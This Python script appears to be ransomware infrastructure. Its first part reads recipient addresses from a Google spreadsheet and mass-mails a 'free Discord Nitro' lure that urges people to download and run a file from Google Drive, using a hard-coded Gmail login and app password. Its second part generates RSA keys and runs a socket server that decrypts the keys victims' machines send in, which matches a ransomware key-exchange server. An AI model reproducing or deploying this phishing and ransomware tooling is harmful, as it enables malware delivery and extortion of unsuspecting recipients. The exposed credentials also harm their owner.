import os
import secrets
import socket
import requests
import csv
import base64
import smtplib
from email.message import EmailMessage
import ssl
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from email.mime.text import MIMEText

SERVER_IP = '127.0.0.1'
SERVER_PORT = 5678

url = 'https://docs.google.com/spreadsheets/d/1Wcb2hzqL56QorxwBFW96QWSuyYv_x9VwiFH1nMqJCHA/gviz/tq?tqx=out:csv'
response = requests.get(url)
text = response.content.decode('utf-8')
rows = csv.reader(text.splitlines())
next(rows)
for row in rows:
    fifth_element = row[4]  
    print(fifth_element)   
    sender_email = "mansour26082001@gmail.com"
    recipient_email = fifth_element
    subject = "unlimited Free nitro Discord"
    drive_link='https://drive.google.com/file/d/1lnteWoUFouz6SEu0HijaakuH3gO7AT1q/view?usp=sharing'

#add the .exe files
    body = 'Please download and dont forget to run this script to claim your unlimited free nitro from Google Drive: <a href="{}">{} </a>'.format(drive_link, drive_link)
    smtp_server = "smtp.gmail.com"
    smtp_password = 'rlhefewwjaxzpvpg'
    
    em=EmailMessage()
    em['From']=sender_email
    em['To'] =  recipient_email

    em['subject']=subject
    em.add_alternative(body, subtype='html')
    
    context= ssl.create_default_context
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(sender_email, smtp_password)
        smtp.sendmail(sender_email, recipient_email, em.as_string())
        print('Mail sent to ', fifth_element)








# Generate a new 2048-bit RSA key pair
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048
)
public_key = private_key.public_key()

# Serialize the public key to PEM format
public_pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)
# Convert the private key to PEM format
private_pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)

# Print the public key
print(public_pem.decode())
# Save the keys to a file
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop") 
 # get the path to the desktop folder
key_file_path = os.path.join(desktop_path, "keyPair.key") 
 # create the file path for the key pair file
 
keys=str(public_pem)+ "\n" + str(private_pem)
with open(key_file_path, "wb") as key_file:
    key_file.write(keys.encode())

print("Key pair saved to desktop as keyPair.key")
with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
    s.bind((SERVER_IP, SERVER_PORT))
    print('Server is listening')
    s.listen(1)
    while True:
        conn, addr = s.accept()
        print(f'Connection accepted from :{addr}')
        with conn:
            # Send the public key to the client
            print('Sending Public Key to Client')
            conn.send(public_pem)

            # Receive the encrypted key from the client
            encrypted_key = conn.recv(2048)
            print('The recieved encrypted key from Client is: ', encrypted_key)
            # Decrypt the key using the RSA private key
            key = private_key.decrypt(
                encrypted_key,
               padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )

            # Send the decrypted key back to the client
            
            conn.send(key)
            print('The sent decrypted key to Client is: ',key)
